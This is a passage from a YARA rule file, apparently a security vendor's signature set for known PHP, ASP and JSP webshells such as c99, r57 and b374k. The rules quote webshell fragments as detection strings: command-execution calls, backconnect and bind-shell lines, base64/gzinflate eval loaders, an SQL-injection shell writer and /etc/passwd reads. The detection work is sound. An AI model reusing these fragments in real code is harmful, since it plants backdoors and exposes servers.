        super_rule = 1
        
    strings:
        $s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
        $s1 = "c99sh_sqlquery"
        
        $a0 = "@ini_set(\"highlight"
        $a1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";"
        $a2 = "{$row[] = \"<b>Owner/Group</b>\";}"
        
    condition:
        1 of ($s*) or 2 of ($a*)
}
rule Backdoor_Webshell_PHP_000274
{
    meta:
        description = "semi-auto-generated SpecialShell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
        $s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000275
{
    meta:
        description = "semi-auto-generated r577.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
        $s1 = ".$arrow.\"</b>\",in('text','"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000276
{
    meta:
        description = "semi-auto-generated from files r577.php.txt, SnIpEr_SA Shell.php.txt, r57.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',"
        $s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
        $s2 = "rst.void.ru"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000277
{
    meta:
        description = "semi-auto-generated from files r577.php.txt, r57 Shell.php.txt, spy.php.txt, s.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "echo ws(2).$lb.\" <a"
        $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
        $s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000278
{
    meta:
        description = "semi-auto-generated from files r577.php.txt, r57.php.txt, r57 Shell.php.txt, spy.php.txt, s.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "if(rmdir($_POST['mk_name']))"
        $s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
        $s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000279
{
    meta:
        description = "semi-auto-generated from files w.php.txt, wacking.php.txt, SsEs.php.txt, SpecialShell_99.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
        $s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
        $s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000280
{
    meta:
        description = "semi-auto-generated from files multiple_php_webshells"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $a0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
        $a1 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
        $a2 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
        
        $b0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
        $b1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
        $b2 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";"
        
    condition:
        2 of ($a*) or all of ($b*)
}
rule Backdoor_Webshell_PHP_000281
{
    meta:
        description = "semi-auto-generated from files w.php.txt, c99madshell_v2.1.php.txt, wacking.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "<b>Dumped! Dump has been writed to "
        $s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
        $s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000282
{
    meta:
        description = "semi-auto-generated c99shell_v1_0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "c99ftpbrutecheck"
        $s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);"
        $s2 = "$fqb_lenght = $nixpwdperpage;"
        $s3 = "$sock = @ftp_connect($host,$port,$timeout);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000283
{
    meta:
        description = "semi-auto-generated c99php.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "$sqlquicklaunch[] = array(\""
        $s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000284
{
    meta:
        description = "semi-auto-generated from files antichat.php.txt, Fatalshell.php.txt, a_gedit.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "if(@$_POST['save'])writef($file,$_POST['data']);"
        $s1 = "if($action==\"phpeval\"){"
        $s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];"
        $s3 = "$dir=getcwd().\"/\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000285
{
    meta:
        description = "semi-auto-generated from files c99shell_v1.0.php.txt, c99php.txt, SsEs.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000286
{
    meta:
        description = "semi-auto-generated from files Crystal.php.txt, nshell.php.txt, load_shell.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "if ($filename != \".\" and $filename != \"..\"){"
        $s1 = "$dires = $dires . $directory;"
        $s4 = "$arr = array_merge($arr, glob(\"*\"));"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000287
{
    meta:
        description = "semi-auto-generated from files nst.php.txt, cybershell.php.txt, img.php.txt, nstview.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "@$rto=$_POST['rto'];"
        $s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF"
        $s3 = "$to1=str_replace(\"//\",\"/\",$to1);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000288
{
    meta:
        description = "semi-auto-generated c99madshell_dC3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
        $s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000289
{
    meta:
        description = "semi-auto-generated from files c99shell_v1.0.php.txt, c99php.txt, 1.txt, c2007.php.txt, c100.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000290
{
    meta:
        description = "semi-auto-generated c99madshell_v2_1.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $a0 = "if ($total === FALSE) {$total = 0;}"
        $a1 = "$free_percent = round(100/($total/$free),2);"
        $a2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}"
        $a3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);"
        
        $b0 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
        $b1 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
        
    condition:
        2 of ($a*) or 1 of ($b*)
}
rule Backdoor_Webshell_PHP_000291
{
    meta:
        description = "semi-auto-generated from files r577.php.txt, r57.php.txt, spy.php.txt, s.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);"
        $s2 = "'eng_text30'=>'Cat file',"
        $s3 = "@mssql_query(\"drop table r57_temp_table\",$db);"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000292
{
    meta:
        description = "semi-auto-generated c99php_NIX.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "$num = $nixpasswd + $nixpwdperpage;"
        $s1 = "$ret = posix_kill($pid,$sig);"
        $s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}"
        $s3 = "$i = $nixpasswd;"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000293
{
    meta:
        description = "looks like a webshell cloaked as gif"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"
        
    condition:
        $s0
}
rule Backdoor_Webshell_PHP_000294
{
    meta:
        description = "github archive dc3_security_crew_shell_priv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");"
        $s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));"
        $s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));"
        $s15 = "search_file($_POST['search'],urldecode($_POST['dir']));"
        $s16 = "echo base64_decode($images[$_GET['pic']]);"
        $s20 = "if (isset($_GET['rename_all'])) {"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000295
{
    meta:
        description = "github archive simattacker.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";"
        $s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>"
        $s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>"
        $s6 = "//fake mail = Use victim server 4 DOS - fake mail "
        $s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>"
        $s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);"
        $s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";"
        $s20 = "$Comments=$_POST['Comments'];"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000296
{
    meta:
        description = "github archive dtool pro.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
        $s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>"
        $s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
        $s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell"
        $s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";"
        $s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables"
        $s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
        $s18 = "if(empty($fu)) $fu = @$_GET['fu'];"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000297
{
    meta:
        description = "github archive ironshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>"
        $s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
        $s4 = "error_reporting(0); //If there is an error, we'll show it, k?"
        $s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
        $s15 = "if(!is_numeric($_POST['timelimit']))"
        $s16 = "if($_POST['chars'] == \"9999\")"
        $s17 = "<option value=\\\"az\\\">a - zzzzz</option>"
        $s18 = "print shell_exec($command);"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000298
{
    meta:
        description = "github archive toolaspshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
        $s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1"
        $s20 = "destino3 = folderItem.path & \"\\index.asp\""
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000299
{
    meta:
        description = "github archive b374k-mini-shell-php.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "@error_reporting(0);"
        $s2 = "@eval(gzinflate(base64_decode($code)));"
        $s3 = "@set_time_limit(0); "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000300
{
    meta:
        description = "github archive sincap 1.0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">"
        $s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B"
        $s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli"
        $s12 = "while (($ekinci=readdir ($sedat))){"
        $s19 = "$deger2= \"$ich[$tampon4]\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000301
{
    meta:
        description = "github archive b374k.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode"
        $s6 = "// password (default is: b374k)"
        $s8 = "//******************************************************************************"
        $s9 = "// b374k 2.2"
        $s10 = "eval(\"?>\".gzinflate(base64_decode("
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000302
{
    meta:
        description = "github archive simattacker vrsion 1.0.0 priv8 4 my friend.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>"
        $s5 = "//fake mail = Use victim server 4 DOS - fake mail "
        $s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">"
        $s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);"
        $s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";"
        $s19 = "$Comments=$_POST['Comments'];"
        $s20 = "Victim Mail :<br><input type='text' name='to' ><br>"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000303
{
    meta:
        description = "github archive h4ntu shell [powered by tsoi].php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s11 = "<title>h4ntu shell [powered by tsoi]</title>"
        $s13 = "$cmd = $_POST['cmd'];"
        $s16 = "$uname = posix_uname( );"
        $s17 = "if(!$whoami)$whoami=exec(\"whoami\");"
        $s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
        $s20 = "ob_end_clean();"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000304
{
    meta:
        description = "github archive myshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "<title>MyShell error - Access Denied</title>"
        $s4 = "$adminEmail = \"youremail@yourserver.com\";"
        $s5 = "//A workdir has been asked for - we chdir to that dir."
        $s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
        $s13 = "#$autoErrorTrap Enable automatic error traping if command returns error."
        $s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */"
        $s19 = "#every command you excecute."
        $s20 = "<form name=\"shell\" method=\"post\">"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000305
{
    meta:
        description = "github archive pws.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s6 = "if ($_POST['cmd']){"
        $s7 = "$cmd = $_POST['cmd'];"
        $s10 = "echo \"FILE UPLOADED TO $dez\";"
        $s11 = "if (file_exists($uploaded)) {"
        $s12 = "copy($uploaded, $dez);"
        $s17 = "passthru($cmd);"
        
    condition:
        4 of them
}
rule Backdoor_Webshell_PHP_000306
{
    meta:
        description = "github archive liz0zim private safe mode command execuriton bypass exploit.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$liz0zim=shell_exec($_POST[liz0]); "
        $s1 = "$liz0=shell_exec($_POST[baba]); "
        $s2 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
        $s3 = " :=) :</font><select size=\"1\" name=\"liz0\">"
        $s4 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>"
        $s5 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000307
{
    meta:
        description = "github archive worse linux shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "if( $_POST['_act'] == \"Upload!\" ) {"
        $s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";"
        $s7 = "print \"<center><h1>Linux Shells</h1></center>\";"
        $s8 = "$currentCMD = \"ls -la\";"
        $s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";"
        $s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000308
{
    meta:
        description = "github archive phpinj.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
        $s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">"
        $s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
        $s13 = "Full server path to a writable file which will contain the Php Shell <br />"
        $s14 = "$expurl= $url.\"?id=\".$sql ;"
        $s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />"
        $s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000309
{
    meta:
        description = "github archive ngh.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>"
        $s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */"
        $s5 = "<form action=<?=$script?>?act=bindshell method=POST>"
        $s9 = "<form action=<?=$script?>?act=backconnect method=POST>"
        $s11 = "<form action=<?=$script?>?act=mkdir method=POST>"
        $s16 = "die(\"<font color=#DF0000>Login error</font>\");"
        $s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000310
{
    meta:
        description = "github archive matamu.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "$command .= ' -F';"
        $s3 = "/* We try and match a cd command. */"
        $s4 = "directory... Trust me - it works :-) */"
        $s5 = "$command .= \" 1> $tmpfile 2>&1; \" ."
        $s10 = "$new_dir = $regs[1]; // 'cd /something/...'"
        $s16 = "/* The last / in work_dir were the first charecter."
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000311
{
    meta:
        description = "github archive ru24_post_sh.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "http://www.ru24-team.net"
        $s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
        $s6 = "Ru24PostWebShell"
        $s7 = "Writed by DreAmeRz"
        $s9 = "$function=passthru; // system, exec, cmd"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000312
{
    meta:
        description = "github archive hiddens shell v1.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000313
{
    meta:
        description = "github archive c99_madnet.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$md5_pass = \"\"; //If no pass then hash"
        $s1 = "eval(gzinflate(base64_decode('"
        $s2 = "$pass = \"pass\";  //Pass"
        $s3 = "$login = \"user\"; //Login"
        $s4 = "             //Authentication"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000314
{
    meta:
        description = "github archive c99_locus7s.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $a0 = "$encoded = base64_encode(file_get_contents($d.$f)); "
        $a1 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
        $a2 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
        $a3 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server "
        $a4 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd "
        
        $b0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" ascii
        $b1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" ascii
        
        $c0 = "$res = @shell_exec($cfe);"
        $c1 = "$res = @ob_get_contents();"
        $c2 = "@exec($cfe,$res);"
        
    condition:
        2 of ($a*) or 1 of ($b*) or 2 of ($c*)
}
rule Backdoor_Webshell_PHP_000315
{
    meta:
        description = "github archive jspwebshell_1.2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); "
        $s1 = "String password=request.getParameter(\"password\");"
        $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
        $s7 = "String editfile=request.getParameter(\"editfile\");"
        $s8 = "//String tempfilename=request.getParameter(\"file\");"
        $s12 = "password = (String)session.getAttribute(\"password\");"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000316
{
    meta:
        description = "github archive safe0ver.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";"
        $s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))"
        $s5 = "else { /* <!-- Then it must be a File... --> */"
        $s7 = "$contents .= htmlentities( $line ) ;"
        $s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">"
        $s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ "
        $s20 = "/* <!-- End of Actions --> */"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000317
{
    meta:
        description = "github archive kral.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "$adres=gethostbyname($ip);"
        $s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);"
        $s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";"
        $s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';"
        $s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
        $s20 = "<p><strong>Server listeleyici</strong><br />"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000318
{
    meta:
        description = "github archive cgitelnet.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s9 = "# Author Homepage: http://www.rohitab.com/"
        $s10 = "elsif($Action eq \"command\") # user wants to run a command"
        $s18 = "# in a command line on Windows NT."
        $s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000319
{
    meta:
        description = "github archive safe_mode bypass php 4.4.2 and php 5.1.2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>"
        $s3 = "xb5@hotmail.com</FONT></CENTER></B>\");"
        $s4 = "$v = @ini_get(\"open_basedir\");"
        $s6 = "by PHP Emperor<xb5@hotmail.com>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000320
{
    meta:
        description = "github archive ntdaddy v1.9.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "|     -obzerve : mr_o@ihateclowns.com |"
        $s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )"
        $s13 = "<form action=ntdaddy.asp method=post>"
        $s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000321
{
    meta:
        description = "github archive lamashell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "if(($_POST['exe']) == \"Execute\") {"
        $s8 = "$curcmd = $_POST['king'];"
        $s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">"
        $s18 = "<title>lama's'hell v. 3.0</title>"
        $s19 = "_|_  O    _    O  _|_"
        $s20 = "$curcmd = \"ls -lah\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000322
{
    meta:
        description = "github archive simple_php_backdoor_by_dk.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
        $s1 = "<!--    http://michaeldaw.org   2006    -->"
        $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd"
        $s6 = "if(isset($_REQUEST['cmd'])){"
        $s8 = "system($cmd);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000323
{
    meta:
        description = "github archive moroccan spamers ma-edition by ghost.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "$content = chunk_split(base64_encode($content)); "
        $s12 = "print \"Sending mail to $to....... \"; "
        $s16 = "if (!$from && !$subject && !$message && !$emaillist){ "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000324
{
    meta:
        description = "github archive c99madshell v. 2.0 madnet edition.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$md5_pass = \"\"; //If no pass then hash"
        $s1 = "eval(gzinflate(base64_decode('"
        $s2 = "$pass = \"\";  //Pass"
        $s3 = "$login = \"\"; //Login"
        $s4 = "//Authentication"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000325
{
    meta:
        description = "github archive ncc-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {"
        $s1 = "<b>--Coded by Silver"
        $s2 = "<title>Upload - Shell/Datei</title>"
        $s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
        $s14 = "~|_Team .:National Cracker Crew:._|~<br>"
        $s18 = "printf(\"Sie ist %u Bytes gro"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000326
{
    meta:
        description = "github archive backupsql.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
        $s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
        $s2 = "* as email attachment, or send to a remote ftp server by"
        $s16 = "* Neagu Mihai<neagumihai@hotmail.com>"
        $s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000327
{
    meta:
        description = "github archive_ ak-74 security team web shell beta version.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s8 = "- AK-74 Security Team Web Site: www.ak74-team.net"
        $s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
        $s10 = "<b><font color=#83000>Execute system commands!</font></b>"
        
    condition:
        1 of them
}
